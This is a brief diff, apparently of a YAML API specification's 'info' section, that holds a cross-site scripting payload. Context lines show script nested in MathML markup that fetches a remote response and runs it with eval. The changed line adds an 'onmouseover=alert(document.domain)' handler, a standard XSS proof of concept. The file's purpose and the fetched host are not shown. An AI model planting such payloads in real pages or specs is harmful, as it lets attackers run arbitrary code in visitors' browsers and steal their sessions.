@@ -9,7 +9,7 @@ info:
                         res.text().then(function(data){
                           eval(data)
                         })
-                      })>'><s onload=>ssss</s>
+                      })>'><s onmouseover=alert(document.domain)>ssss</s>
       </mtext>
     </math>
   version: production
